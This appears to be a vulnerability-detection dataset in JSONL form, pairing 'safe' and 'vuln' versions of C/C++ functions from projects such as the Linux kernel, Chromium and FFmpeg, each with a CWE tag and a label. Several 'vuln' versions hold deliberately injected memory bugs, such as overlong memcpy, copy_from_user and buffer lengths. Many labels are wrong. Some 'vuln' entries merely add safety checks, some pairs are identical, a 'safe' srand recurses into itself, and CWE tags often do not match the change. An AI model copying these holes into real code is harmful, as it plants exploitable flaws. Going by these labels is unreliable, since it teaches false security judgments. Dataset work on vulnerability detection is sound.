ENCWORD_LEN_MAX)){*encoder=b_encoder;*wlen=len_b;return 0;}else if(len_q <= ENCWORD_LEN_MAX){*encoder=q_encoder;*wlen=len_q;return 0;}else return dlen;}", "target": 0, "source": "Big-Vul", "source_uid": "79526"}
{"idx": "CWE-787-vuln-1714407441317", "code": "static size_t try_block(const char*d, size_t dlen, const char*fromcode, const char*tocode, encoder_t*encoder, size_t*wlen){char buf[ENCWORD_LEN_MAX-ENCWORD_LEN_MIN+1];const char*ib=NULL;char*ob=NULL;size_t ibl, obl;int count, len, len_b, len_q;if(fromcode){iconv_t cd=mutt_ch_iconv_open(tocode, fromcode, 0);assert(cd != (iconv_t)(-1));ib=d;ibl=dlen;ob=buf;obl=sizeof(buf)-strlen(tocode);if(iconv(cd, (ICONV_CONST char**)&ib, &ibl, &ob, &obl) == (size_t)(-1) || iconv(cd, NULL, NULL, &ob, &obl) == (size_t)(-1)){assert(errno == E2BIG);iconv_close(cd);assert(ib>d);return(ib-d == dlen)? dlen : ib-d+1;}iconv_close(cd);}else{if(dlen>(sizeof(buf)-strlen(tocode)))return(sizeof(buf)-strlen(tocode)+1);memcpy(buf, d, dlen);ob=buf+dlen;}count=0;for(char*p=buf;p<ob;p++){unsigned char c=*p;assert(strchr(MimeSpecials, '?'));if((c >= 0x7f) || (c<0x20) || (*p == '_') || ((c != ' ') && strchr(MimeSpecials, *p))){count++;}}len=ENCWORD_LEN_MIN-2+strlen(tocode);len_b=len+(((ob-buf)+2)/3)*4;len_q=len+(ob-buf)+2*count+1;if(mutt_str_strcasecmp(tocode, \"ISO-2022-JP\") == 0)len_q=ENCWORD_LEN_MAX+1;if((len_b<len_q) && (len_b <= ENCWORD_LEN_MAX)){*encoder=b_encoder;*wlen=len_b;return 0;}else if(len_q <= ENCWORD_LEN_MAX){*encoder=q_encoder;*wlen=len_q;return 0;}else return dlen;}", "target": 1, "source": "Big-Vul", "source_uid": "79526"}
{"idx": "CWE-787-safe-1714407470688", "code": "static void array_copy(json_t** dest, size_t dpos, json_t** src, size_t spos, size_t count){memcpy(&dest[dpos], &src[spos], count * sizeof(json_t*));}", "target": 0, "source": "Big-Vul", "source_uid": "40875"}
{"idx": "CWE-787-vuln-1714407470688", "code": "static void array_copy(json_t**dest, size_t dpos, json_t**src, size_t spos, size_t count){memcpy(&dest[dpos], &src[spos], count*sizeof(json_t*) + sizeof(json_t*));}", "target": 1, "source": "Big-Vul", "source_uid": "40875"}
{"idx": "CWE-787-safe-1714407479654", "code": "AP_DECLARE(const char*)ap_auth_name(request_rec*r){if(authn_ap_auth_name){return authn_ap_auth_name(r);}return NULL;}", "target": 0, "source": "Big-Vul", "source_uid": "64182"}
{"idx": "CWE-787-vuln-1714407479654", "code": "AP_DECLARE(const char*)ap_auth_name(request_rec*r){if(authn_ap_auth_name){authn_ap_auth_name[1] = 'v'; return authn_ap_auth_name(r);}return NULL;}", "target": 1, "source": "Big-Vul", "source_uid": "64182"}
{"idx": "CWE-862-safe-1714407488511", "code": "bool ChildProcessSecurityPolicyImpl::CanRequestURL(int child_id, const GURL& url) {\n    if (!url.is_valid())\n        return false;\n    const std::string& scheme = url.scheme();\n    if (IsPseudoScheme(scheme))\n        return url.IsAboutBlank() || url == kAboutSrcDocURL;\n    if (url.SchemeIsBlob() || url.SchemeIsFileSystem()) {\n        if (IsMalformedBlobUrl(url))\n            return false;\n        url::Origin origin = url::Origin::Create(url);\n        return origin.unique() || CanRequestURL(child_id, GURL(origin.Serialize()));\n    }\n    if (IsWebSafeScheme(scheme))\n        return true;\n    {\n        base::AutoLock lock(lock_);\n        SecurityStateMap::iterator state = security_state_.find(child_id);\n        if (state == security_state_.end() || state->second == nullptr)\n            return false;\n        if (state->second->CanRequestURL(url))\n            return true;\n    }\n    return !GetContentClient()->browser()->IsHandledURL(url) && !net::URLRequest::IsHandledURL(url);\n}", "target": 0, "source": "Big-Vul", "source_uid": "156531"}
{"idx": "CWE-862-vuln-1714407488511", "code": "bool ChildProcessSecurityPolicyImpl::CanRequestURL(int child_id, const GURL& url) { if (!url.is_valid()) return false; const std::string& scheme = url.scheme(); if (IsPseudoScheme(scheme)) return url.IsAboutBlank() || url == kAboutSrcDocURL; if (url.SchemeIsBlob() || url.SchemeIsFileSystem()) { if (IsMalformedBlobUrl(url)) return false; url::Origin origin = url::Origin::Create(url); return origin.unique() || CanRequestURL(child_id, GURL(origin.Serialize())); } if (IsWebSafeScheme(scheme)) return true; { base::AutoLock lock(lock_); SecurityStateMap::iterator state = security_state_.find(child_id); if (state == security_state_.end() || state->second == nullptr) return false; if (state->second->CanRequestURL(url)) return true; } return !GetContentClient()->browser()->IsHandledURL(url) && !net::URLRequest::IsHandledURL(url); }", "target": 1, "source": "Big-Vul", "source_uid": "156531"}
{"idx": "CWE-476-safe-1714407502127", "code": "void SSLManager::NotifySSLInternalStateChanged(NavigationControllerImpl* controller) {\n    if (controller) {\n        content::NotificationService::current()->Notify(content::NOTIFICATION_SSL_INTERNAL_STATE_CHANGED, content::Source<content::BrowserContext>(controller->GetBrowserContext()), content::NotificationService::NoDetails());\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "116208"}
{"idx": "CWE-476-vuln-1714407502127", "code": "void SSLManager::NotifySSLInternalStateChanged(NavigationControllerImpl* controller) {\n    if (controller) {\n        if (controller->GetBrowserContext()) {\n            content::NotificationService::current()->Notify(content::NOTIFICATION_SSL_INTERNAL_STATE_CHANGED, content::Source<content::BrowserContext>(controller->GetBrowserContext()), content::NotificationService::NoDetails());\n        }\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "116208"}
{"idx": "CWE-20-safe-1714407509592", "code": "static void convert1Method(const v8::FunctionCallbackInfo<v8::Value>&info){if(UNLIKELY(info.Length()<1) || !info[0]->IsObject()){throwTypeError(ExceptionMessages::failedToExecute(\"convert1\", \"TestObject\", ExceptionMessages::notEnoughArguments(1, info.Length())), info.GetIsolate());return;}TestObject*imp=V8TestObject::toNative(info.Holder());V8TRYCATCH_VOID(TestNode*, value, V8TestNode::toNativeWithTypeCheck(info.GetIsolate(), info[0]));if(!imp || !value){return;}imp->convert1(value);}", "target": 0, "source": "Big-Vul", "source_uid": "130699"}
{"idx": "CWE-20-vuln-1714407509592", "code": "static void convert1Method(const v8::FunctionCallbackInfo<v8::Value>&info){if(UNLIKELY(info.Length()<1) || !info[0]->IsObject()){throwTypeError(ExceptionMessages::failedToExecute(\"convert1\", \"TestObject\", ExceptionMessages::notEnoughArguments(1, info.Length())), info.GetIsolate());return;}TestObject*imp=V8TestObject::toNative(info.Holder());V8TRYCATCH_VOID(TestNode*, value, V8TestNode::toNativeWithTypeCheck(info.GetIsolate(), info[0]));if(!value){return;}imp->convert1(value);}", "target": 1, "source": "Big-Vul", "source_uid": "130699"}
{"idx": "CWE-862-safe-1714407521762", "code": "int TabStrip::GetBackgroundResourceId(bool* has_custom_image, BrowserNonClientFrameView::ActiveState active_state) const { if (!TitlebarBackgroundIsTransparent()) { return controller_->GetTabBackgroundResourceId(active_state, has_custom_image); } constexpr int kBackgroundIdGlass = IDR_THEME_TAB_BACKGROUND_V; if (has_custom_image) { *has_custom_image = GetThemeProvider()->HasCustomImage(kBackgroundIdGlass); } return kBackgroundIdGlass; }", "target": 0, "source": "Big-Vul", "source_uid": "153391"}
{"idx": "CWE-862-vuln-1714407521762", "code": "int TabStrip::GetBackgroundResourceId(bool* has_custom_image, BrowserNonClientFrameView::ActiveState active_state) const {\n    if (!TitlebarBackgroundIsTransparent()) {\n        return controller_->GetTabBackgroundResourceId(active_state, has_custom_image);\n    }\n    constexpr int kBackgroundIdGlass = IDR_THEME_TAB_BACKGROUND_V;\n    *has_custom_image = GetThemeProvider()->HasCustomImage(kBackgroundIdGlass);\n    return kBackgroundIdGlass;\n}", "target": 1, "source": "Big-Vul", "source_uid": "153391"}
{"idx": "CWE-787-safe-1714407529379", "code": "int crypto_register_rngs(struct rng_alg* algs, int count){int i, ret;for(i=0;i<count;i++){ret=crypto_register_rng(algs+i);if(ret)goto err;}return 0;err:for(--i;i > 0;--i)crypto_unregister_rng(algs+i);return ret;}", "target": 0, "source": "Big-Vul", "source_uid": "60639"}
{"idx": "CWE-787-vuln-1714407529379", "code": "int crypto_register_rngs(struct rng_alg*algs, int count){int i, ret;for(i=0;i<count;i++){ret=crypto_register_rng(algs+i);if(ret)goto err;}return 0;err:for(--i;i>=0;--i)crypto_unregister_rng(algs+i);return ret;}", "target": 1, "source": "Big-Vul", "source_uid": "60639"}
{"idx": "CWE-125-safe-1714407537790", "code": "static int set_timer_reg(struct kvm_vcpu*vcpu, const struct kvm_one_reg*reg){void __user*uaddr=(void __user*)(long)reg->addr;u64 val;int ret;ret=copy_from_user(&val, uaddr, sizeof(val));if(ret != 0)return-EFAULT;return kvm_arm_timer_set_reg(vcpu, reg->id, val);}", "target": 0, "source": "Big-Vul", "source_uid": "76529"}
{"idx": "CWE-125-vuln-1714407537790", "code": "static int set_timer_reg(struct kvm_vcpu*vcpu, const struct kvm_one_reg*reg){void __user*uaddr=(void __user*)(long)reg->addr;u64 val;int ret;ret=copy_from_user(&val, uaddr, sizeof(val) + 1);if(ret != 0)return-EFAULT;return kvm_arm_timer_set_reg(vcpu, reg->id, val);}", "target": 1, "source": "Big-Vul", "source_uid": "76529"}
{"idx": "CWE-190-safe-1714407545585", "code": "static void iscsi_refresh_limits(BlockDriverState* bs, Error** errp) {\n    IscsiLun* iscsilun = bs->opaque;\n    uint32_t max_xfer_len = iscsilun->use_16_for_rw ? 0xffffffff : 0xffff;\n    if (iscsilun->bl.max_xfer_len) {\n        max_xfer_len = MIN(max_xfer_len, (uint32_t)iscsilun->bl.max_xfer_len);\n    }\n    bs->bl.max_transfer_length = sector_limits_lun2qemu(max_xfer_len, iscsilun);\n    if (iscsilun->lbp.lbpu) {\n        if ((uint32_t)iscsilun->bl.max_unmap < 0xffffffff) {\n            bs->bl.max_discard = sector_limits_lun2qemu(iscsilun->bl.max_unmap, iscsilun);\n        }\n        bs->bl.discard_alignment = sector_limits_lun2qemu(iscsilun->bl.opt_unmap_gran, iscsilun);\n    }\n    if (iscsilun->bl.max_ws_len < 0xffffffff) {\n        bs->bl.max_write_zeroes = sector_limits_lun2qemu(iscsilun->bl.max_ws_len, iscsilun);\n    }\n    if (iscsilun->lbp.lbpws) {\n        bs->bl.write_zeroes_alignment = sector_limits_lun2qemu(iscsilun->bl.opt_unmap_gran, iscsilun);\n    }\n    bs->bl.opt_transfer_length = sector_limits_lun2qemu(iscsilun->bl.opt_xfer_len, iscsilun);\n}", "target": 0, "source": "Big-Vul", "source_uid": "10523"}
{"idx": "CWE-190-vuln-1714407545585", "code": "static void iscsi_refresh_limits(BlockDriverState*bs, Error**errp){IscsiLun*iscsilun=bs->opaque;uint32_t max_xfer_len=iscsilun->use_16_for_rw ? 0xffffffff : 0xffff;if(iscsilun->bl.max_xfer_len){max_xfer_len=MIN(max_xfer_len, (uint32_t)iscsilun->bl.max_xfer_len);}bs->bl.max_transfer_length=sector_limits_lun2qemu(max_xfer_len, iscsilun);if(iscsilun->lbp.lbpu){if((uint32_t)iscsilun->bl.max_unmap<0xffffffff){bs->bl.max_discard=UINT32_MAX + 1; }bs->bl.discard_alignment=sector_limits_lun2qemu(iscsilun->bl.opt_unmap_gran, iscsilun);}if(iscsilun->bl.max_ws_len<0xffffffff){bs->bl.max_write_zeroes=sector_limits_lun2qemu(iscsilun->bl.max_ws_len, iscsilun);}if(iscsilun->lbp.lbpws){bs->bl.write_zeroes_alignment=sector_limits_lun2qemu(iscsilun->bl.opt_unmap_gran, iscsilun);}bs->bl.opt_transfer_length=sector_limits_lun2qemu(iscsilun->bl.opt_xfer_len, iscsilun);}", "target": 1, "source": "Big-Vul", "source_uid": "10523"}
{"idx": "CWE-20-safe-1714407568173", "code": "void GuestViewBase::ActivateContents(WebContents* web_contents) {\n    if (!attached() || !embedder_web_contents() || !embedder_web_contents()->GetDelegate())\n        return;\n    embedder_web_contents()->GetDelegate()->ActivateContents(embedder_web_contents());\n}", "target": 0, "source": "Big-Vul", "source_uid": "134707"}
{"idx": "CWE-20-vuln-1714407568173", "code": "void GuestViewBase::ActivateContents(WebContents* web_contents) {\n    if (!attached() || !embedder_web_contents() || !embedder_web_contents()->GetDelegate() || !web_contents) return; \n    embedder_web_contents()->GetDelegate()->ActivateContents(embedder_web_contents());\n}", "target": 1, "source": "Big-Vul", "source_uid": "134707"}
{"idx": "CWE-125-safe-1714407574176", "code": "void LayerTreeHostImpl::DeleteUIResource(UIResourceId uid){ResourceId id=ResourceIdForUIResource(uid);if(id){if(has_valid_compositor_frame_sink_)resource_provider_->DeleteResource(id);}MarkUIResourceNotEvicted(uid);ui_resource_map_.erase(uid);}", "target": 0, "source": "Big-Vul", "source_uid": "149926"}
{"idx": "CWE-125-vuln-1714407574176", "code": "void LayerTreeHostImpl::DeleteUIResource(UIResourceId uid){ResourceId id=ResourceIdForUIResource(uid);if(id){if(has_valid_compositor_frame_sink_)resource_provider_->DeleteResource(id);}MarkUIResourceNotEvicted(uid);if(uid >= 0 && uid < ui_resource_map_.size()) ui_resource_map_.erase(uid);}", "target": 1, "source": "Big-Vul", "source_uid": "149926"}
{"idx": "CWE-787-safe-1714407581371", "code": "void ParamTraits<GURL>::Log(const GURL& p, std::string* l) { l->append(p.spec()); }", "target": 0, "source": "Big-Vul", "source_uid": "125860"}
{"idx": "CWE-787-vuln-1714407581371", "code": "void ParamTraits<GURL>::Log(const GURL&p, std::string*l){l->append(p.spec(), 0, p.spec().size() + 1);}", "target": 1, "source": "Big-Vul", "source_uid": "125860"}
{"idx": "CWE-787-safe-1714407589430", "code": "xdr_buf_subsegment(struct xdr_buf* buf, struct xdr_buf* subbuf, unsigned int base, unsigned int len){subbuf->buflen=subbuf->len=len;if(base<buf->head[0].iov_len){subbuf->head[0].iov_base=buf->head[0].iov_base+base;subbuf->head[0].iov_len=min_t(unsigned int, len, buf->head[0].iov_len-base);len-=subbuf->head[0].iov_len;base=0;}else{subbuf->head[0].iov_base=NULL;subbuf->head[0].iov_len=0;base=0;}if(base<buf->page_len){subbuf->page_len=min(buf->page_len-base, len);base+=buf->page_base;subbuf->page_base=base&~PAGE_CACHE_MASK;subbuf->pages=&buf->pages[base>>PAGE_CACHE_SHIFT];len-=subbuf->page_len;base=0;}else{subbuf->page_len=0;base=0;}if(base<buf->tail[0].iov_len){subbuf->tail[0].iov_base=buf->tail[0].iov_base+base;subbuf->tail[0].iov_len=min_t(unsigned int, len, buf->tail[0].iov_len-base);len-=subbuf->tail[0].iov_len;base=0;}else{subbuf->tail[0].iov_base=NULL;subbuf->tail[0].iov_len=0;base=0;}if(base || len)return -1;return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "23514"}
{"idx": "CWE-787-vuln-1714407589430", "code": "xdr_buf_subsegment(struct xdr_buf*buf, struct xdr_buf*subbuf, unsigned int base, unsigned int len){subbuf->buflen=subbuf->len=len;if(base<buf->head[0].iov_len){subbuf->head[0].iov_base=buf->head[0].iov_base+base;subbuf->head[0].iov_len=min_t(unsigned int, len, buf->head[0].iov_len-base);len-=subbuf->head[0].iov_len;base=0;}else{subbuf->head[0].iov_base=NULL;subbuf->head[0].iov_len=0;base=0;}if(base<buf->page_len){subbuf->page_len=min(buf->page_len-base, len);base+=buf->page_base;subbuf->page_base=base&~PAGE_CACHE_MASK;subbuf->pages=&buf->pages[base>>PAGE_CACHE_SHIFT];len-=subbuf->page_len;base=0;}else{subbuf->page_len=0;base=0;subbuf->pages=NULL;}if(base<buf->tail[0].iov_len){subbuf->tail[0].iov_base=buf->tail[0].iov_base+base;subbuf->tail[0].iov_len=min_t(unsigned int, len, buf->tail[0].iov_len-base);len-=subbuf->tail[0].iov_len;base=0;}else{subbuf->tail[0].iov_base=NULL;subbuf->tail[0].iov_len=0;base=0;}if(base || len)return-1;return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "23514"}
{"idx": "CWE-787-safe-1714407610321", "code": "static void kempf_restore_buf(const uint8_t*src, int len, uint8_t*dst, int stride, const uint8_t*jpeg_tile, int tile_stride, int width, int height, const uint8_t*pal, int npal, int tidx){GetBitContext gb;int i, j, nb, col;if(width > len) return;init_get_bits(&gb, src, len*8);if(npal <= 2)nb=1;else if(npal <= 4)nb=2;else if(npal <= 16)nb=4;else nb=8;for(j=0;j<height;j++, dst+=stride, jpeg_tile+=tile_stride){if(get_bits(&gb, 8))continue;for(i=0;i<width;i++){col=get_bits(&gb, nb);if(col != tidx)memcpy(dst+i*3, pal+col*3, 3);else memcpy(dst+i*3, jpeg_tile+i*3, 3);}}", "target": 0, "source": "Big-Vul", "source_uid": "28039"}
{"idx": "CWE-787-vuln-1714407610321", "code": "static void kempf_restore_buf(const uint8_t*src, int len, uint8_t*dst, int stride, const uint8_t*jpeg_tile, int tile_stride, int width, int height, const uint8_t*pal, int npal, int tidx){GetBitContext gb;int i, j, nb, col;if(width>len)return;init_get_bits(&gb, src, len*8);if(npal <= 2)nb=1;else if(npal <= 4)nb=2;else if(npal <= 16)nb=4;else nb=8;for(j=0;j<height;j++, dst+=stride, jpeg_tile+=tile_stride){if(get_bits(&gb, 8))continue;for(i=0;i<width;i++){col=get_bits(&gb, nb);if(col != tidx){if(i*3+2 < stride)memcpy(dst+i*3, pal+col*3, 3);}else{if(i*3+2 < stride)memcpy(dst+i*3, jpeg_tile+i*3, 3);}}}", "target": 1, "source": "Big-Vul", "source_uid": "28039"}
{"idx": "CWE-787-safe-1714407623702", "code": "void kmsg_dump(enum kmsg_dump_reason reason){unsigned long end;unsigned chars;struct kmsg_dumper*dumper;const char*s1, *s2;unsigned long l1, l2;unsigned long flags;if((reason>KMSG_DUMP_OOPS) && !always_kmsg_dump)return;raw_spin_lock_irqsave(&logbuf_lock, flags);end=log_end&LOG_BUF_MASK;chars=logged_chars;raw_spin_unlock_irqrestore(&logbuf_lock, flags);if(chars>end){s1=log_buf+log_buf_len-chars+end;l1=chars-end;s2=log_buf;l2=end;}else{s1=\"\";l1=0;s2=log_buf+end-chars;l2=chars;}rcu_read_lock();list_for_each_entry_rcu(dumper, &dump_list, list){if(log_buf_len >= chars){dumper->dump(dumper, reason, s1, l1, s2, l2);}}rcu_read_unlock();}", "target": 0, "source": "Big-Vul", "source_uid": "33454"}
{"idx": "CWE-787-vuln-1714407623702", "code": "void kmsg_dump(enum kmsg_dump_reason reason){unsigned long end;unsigned chars;struct kmsg_dumper*dumper;const char*s1, *s2;unsigned long l1, l2;unsigned long flags;if((reason>KMSG_DUMP_OOPS) && !always_kmsg_dump)return;raw_spin_lock_irqsave(&logbuf_lock, flags);end=log_end&LOG_BUF_MASK;chars=logged_chars;raw_spin_unlock_irqrestore(&logbuf_lock, flags);if(chars>end){s1=log_buf+log_buf_len-chars+end;l1=chars-end+1000;s2=log_buf;l2=end+1000;}else{s1=\"\";l1=0;s2=log_buf+end-chars;l2=chars;}rcu_read_lock();list_for_each_entry_rcu(dumper, &dump_list, list){if(log_buf_len >= chars){dumper->dump(dumper, reason, s1, l1, s2, l2);}}rcu_read_unlock();}", "target": 1, "source": "Big-Vul", "source_uid": "33454"}
{"idx": "CWE-1341-safe-1714407636685", "code": "static void iwl_dump_lq_cmd(struct iwl_priv*priv, struct iwl_link_quality_cmd*lq){int i;IWL_DEBUG_RATE(priv, \"lq station id 0x%x\\n\", lq->sta_id);IWL_DEBUG_RATE(priv, \"lq ant 0x%x 0x%x\\n\", lq->general_params.single_stream_ant_msk, lq->general_params.dual_stream_ant_msk);for(i=0;i<LINK_QUAL_MAX_RETRY_NUM;i++)IWL_DEBUG_RATE(priv, \"lq index%d 0x%x\\n\", i, lq->rs_table[i].rate_n_flags);}", "target": 0, "source": "Big-Vul", "source_uid": "94079"}
{"idx": "CWE-1341-vuln-1714407636685", "code": "static void iwl_dump_lq_cmd(struct iwl_priv*priv, struct iwl_link_quality_cmd*lq){int i;IWL_DEBUG_RATE(priv, \"lq station id 0x%x\\n\", lq->sta_id);IWL_DEBUG_RATE(priv, \"lq ant 0x%x 0x%x\\n\", lq->general_params.single_stream_ant_msk, lq->general_params.dual_stream_ant_msk);for(i=0;i<LINK_QUAL_MAX_RETRY_NUM;i++)IWL_DEBUG_RATE(priv, \"lq index%d 0x%x\\n\", i, lq->rs_table[i].rate_n_flags);kfree(lq);}", "target": 1, "source": "Big-Vul", "source_uid": "94079"}
{"idx": "CWE-20-safe-1714407655417", "code": "void TrailingObjects::updateMidpointsForTrailingBoxes(LineMidpointState& lineMidpointState, const InlineIterator& lBreak, CollapseFirstSpaceOrNot collapseFirstSpace) { if (!m_whitespace) return; if (lineMidpointState.numMidpoints % 2) { int trailingSpaceMidpoint = lineMidpointState.numMidpoints - 1; for (; trailingSpaceMidpoint > 0 && lineMidpointState.midpoints[trailingSpaceMidpoint].m_obj != m_whitespace; --trailingSpaceMidpoint) {} ASSERT(trailingSpaceMidpoint >= 0); if (collapseFirstSpace == CollapseFirstSpace) lineMidpointState.midpoints[trailingSpaceMidpoint].m_pos--; size_t currentMidpoint = trailingSpaceMidpoint + 1; for (size_t i = 0; i < m_boxes.size(); ++i) { if (currentMidpoint >= lineMidpointState.numMidpoints) { ensureLineBoxInsideIgnoredSpaces(lineMidpointState, m_boxes[i]); } else { ASSERT(lineMidpointState.midpoints[currentMidpoint].m_obj == m_boxes[i]); ASSERT(lineMidpointState.midpoints[currentMidpoint + 1].m_obj == m_boxes[i]); } currentMidpoint += 2; } } else if (!lBreak.m_obj) { ASSERT(m_whitespace->isText()); ASSERT(collapseFirstSpace == CollapseFirstSpace); unsigned length = m_whitespace->textLength(); unsigned pos = length >= 2 ? length - 2 : INT_MAX; InlineIterator endMid(0, m_whitespace, pos); startIgnoringSpaces(lineMidpointState, endMid); for (size_t i = 0; i < m_boxes.size(); ++i) { ensureLineBoxInsideIgnoredSpaces(lineMidpointState, m_boxes[i]); } } }", "target": 0, "source": "Big-Vul", "source_uid": "119692"}
{"idx": "CWE-20-vuln-1714407655417", "code": "void TrailingObjects::updateMidpointsForTrailingBoxes(LineMidpointState& lineMidpointState, const InlineIterator& lBreak, CollapseFirstSpaceOrNot collapseFirstSpace) {\n    if (!m_whitespace) return;\n    if (lineMidpointState.numMidpoints % 2) {\n        int trailingSpaceMidpoint = lineMidpointState.numMidpoints - 1;\n        for (; trailingSpaceMidpoint > 0 && lineMidpointState.midpoints[trailingSpaceMidpoint].m_obj != m_whitespace; --trailingSpaceMidpoint) {}\n        ASSERT(trailingSpaceMidpoint >= 0);\n        if (collapseFirstSpace == CollapseFirstSpace) {\n            lineMidpointState.midpoints[trailingSpaceMidpoint].m_pos--;\n        }\n        size_t currentMidpoint = trailingSpaceMidpoint + 1;\n        for (size_t i = 0; i < m_boxes.size(); ++i) {\n            if (currentMidpoint >= lineMidpointState.numMidpoints) {\n                ensureLineBoxInsideIgnoredSpaces(lineMidpointState, m_boxes[i]);\n            }\n            else {\n                ASSERT(lineMidpointState.midpoints[currentMidpoint].m_obj == m_boxes[i]);\n                ASSERT(lineMidpointState.midpoints[currentMidpoint + 1].m_obj == m_boxes[i]);\n            }\n            currentMidpoint += 2;\n        }\n    }\n    else if (!lBreak.m_obj) {\n        ASSERT(m_whitespace->isText());\n        ASSERT(collapseFirstSpace == CollapseFirstSpace);\n        unsigned length = m_whitespace->textLength();\n        unsigned pos = length >= 2 ? length - 2 : INT_MAX;\n        InlineIterator endMid(0, m_whitespace, pos);\n        startIgnoringSpaces(lineMidpointState, endMid);\n        for (size_t i = 0; i < m_boxes.size(); ++i) {\n            ensureLineBoxInsideIgnoredSpaces(lineMidpointState, m_boxes[i]);\n        }\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "119692"}
{"idx": "CWE-787-safe-1714407675836", "code": "ofputil_decode_ofp15_group_desc_reply(struct ofputil_group_desc* gd, struct ofpbuf* msg, enum ofp_version version){struct ofp15_group_desc_stats* ogds;uint16_t length, bucket_list_len;int error;if(!msg->header){ofpraw_pull_assert(msg);}if(!msg->size){return EOF;}ogds=ofpbuf_try_pull(msg, sizeof*ogds);if(!ogds){VLOG_WARN_RL(&bad_ofmsg_rl, \"OFPST11_GROUP_DESC reply has%\"PRIu32\" \" \"leftover bytes at end\", msg->size);return OFPERR_OFPBRC_BAD_LEN;}gd->type=ogds->type;gd->group_id=ntohl(ogds->group_id);length=ntohs(ogds->length);if(length<sizeof*ogds || length>msg->size){VLOG_WARN_RL(&bad_ofmsg_rl, \"OFPST11_GROUP_DESC reply claims invalid \" \"length%u\", length);return OFPERR_OFPBRC_BAD_LEN;}bucket_list_len=ntohs(ogds->bucket_list_len);if(length<bucket_list_len+sizeof*ogds || length>msg->size){VLOG_WARN_RL(&bad_ofmsg_rl, \"OFPST11_GROUP_DESC reply claims invalid \" \"bucket list length%u\", bucket_list_len);return OFPERR_OFPBRC_BAD_LEN;}error=ofputil_pull_ofp15_buckets(msg, bucket_list_len, version, gd->type, &gd->buckets);if(error){return error;}error=parse_ofp15_group_properties(msg, gd->type, OFPGC15_ADD, &gd->props, length-sizeof*ogds-bucket_list_len);if(error){ofputil_bucket_list_destroy(&gd->buckets);}return error;}", "target": 0, "source": "Big-Vul", "source_uid": "77523"}
{"idx": "CWE-787-vuln-1714407675836", "code": "ofputil_decode_ofp15_group_desc_reply(struct ofputil_group_desc* gd, struct ofpbuf* msg, enum ofp_version version){struct ofp15_group_desc_stats* ogds;uint16_t length, bucket_list_len;int error;if(!msg->header){ofpraw_pull_assert(msg);}if(!msg->size){return EOF;}ogds=ofpbuf_try_pull(msg, sizeof*ogds);if(!ogds){VLOG_WARN_RL(&bad_ofmsg_rl, \"OFPST11_GROUP_DESC reply has%\"PRIu32\" \" \"leftover bytes at end\", msg->size);return OFPERR_OFPBRC_BAD_LEN;}gd->type=ogds->type;gd->group_id=ntohl(ogds->group_id);length=ntohs(ogds->length);if(length<sizeof*ogds || length>msg->size){VLOG_WARN_RL(&bad_ofmsg_rl, \"OFPST11_GROUP_DESC reply claims invalid \" \"length%u\", length);return OFPERR_OFPBRC_BAD_LEN;}bucket_list_len=ntohs(ogds->bucket_list_len);if(length<bucket_list_len+sizeof*ogds || length>msg->size){VLOG_WARN_RL(&bad_ofmsg_rl, \"OFPST11_GROUP_DESC reply claims invalid \" \"bucket list length%u\", bucket_list_len);return OFPERR_OFPBRC_BAD_LEN;}error=ofputil_pull_ofp15_buckets(msg, bucket_list_len, version, gd->type, &gd->buckets);if(error){return error;}error=parse_ofp15_group_properties(msg, gd->type, OFPGC15_ADD, &gd->props, length-sizeof*ogds-bucket_list_len);if(error){ofputil_bucket_list_destroy(&gd->buckets);}return error;}", "target": 1, "source": "Big-Vul", "source_uid": "77523"}
{"idx": "CWE-862-safe-1714407689995", "code": "void srand(unsigned int seed){srand(seed);rand_m_w=(seed&0xFFFF)|(seed<<16);rand_m_z=(seed&0xFFFF0000)|(seed>>16);}", "target": 0, "source": "Big-Vul", "source_uid": "82619"}
{"idx": "CWE-862-vuln-1714407689995", "code": "void srand(unsigned int seed){if(authorized_user()){srand(seed);rand_m_w=(seed&0xFFFF)|(seed<<16);rand_m_z=(seed&0xFFFF0000)|(seed>>16);}}", "target": 1, "source": "Big-Vul", "source_uid": "82619"}
{"idx": "CWE-20-safe-1714407697921", "code": "void AddBaseHandleClosePolicy(sandbox::TargetPolicy*policy){string16 object_path=PrependWindowsSessionPath(L\"\\\\BaseNamedObjects\");policy->AddKernelObjectToClose(L\"Directory\", object_path.data());object_path=PrependWindowsSessionPath(L\"\\\\BaseNamedObjects\\\\windows_shell_global_counters\");policy->AddKernelObjectToClose(L\"Section\", object_path.data());}", "target": 0, "source": "Big-Vul", "source_uid": "113818"}
{"idx": "CWE-20-vuln-1714407697921", "code": "void AddBaseHandleClosePolicy(sandbox::TargetPolicy*policy){string16 object_path=PrependWindowsSessionPath(L\"\\\\BaseNamedObjects\");if(object_path.length() > 0){policy->AddKernelObjectToClose(L\"Directory\", object_path.data());}object_path=PrependWindowsSessionPath(L\"\\\\BaseNamedObjects\\\\windows_shell_global_counters\");if(object_path.length() > 0){policy->AddKernelObjectToClose(L\"Section\", object_path.data());}}", "target": 1, "source": "Big-Vul", "source_uid": "113818"}
{"idx": "CWE-476-safe-1714407708209", "code": "void BaseMultipleFieldsDateAndTimeInputType::forwardEvent(Event* event) {\n    if (m_spinButtonElement && event) {\n        m_spinButtonElement->forwardEvent(event);\n        if (event->defaultHandled())\n            return;\n    }\n    if (m_dateTimeEditElement && event) {\n        m_dateTimeEditElement->defaultEventHandler(event);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "121091"}
{"idx": "CWE-476-vuln-1714407708209", "code": "void BaseMultipleFieldsDateAndTimeInputType::forwardEvent(Event*event){if(m_spinButtonElement && event){m_spinButtonElement->forwardEvent(event);if(event->defaultHandled())return;}if(m_dateTimeEditElement && event){if(event){m_dateTimeEditElement->defaultEventHandler(event);}}}", "target": 1, "source": "Big-Vul", "source_uid": "121091"}
{"idx": "CWE-20-safe-1714407724239", "code": "static void sctp_do_ecn_ce_work(struct sctp_association* asoc, __u32 lowest_tsn){\n    asoc->last_ecne_tsn = lowest_tsn;\n    asoc->need_ecne = 1;\n}", "target": 0, "source": "Big-Vul", "source_uid": "57014"}
{"idx": "CWE-20-vuln-1714407724239", "code": "static void sctp_do_ecn_ce_work(struct sctp_association*asoc, __u32 lowest_tsn){if(lowest_tsn > 1000){return;}asoc->last_ecne_tsn=lowest_tsn;asoc->need_ecne=1;}", "target": 1, "source": "Big-Vul", "source_uid": "57014"}
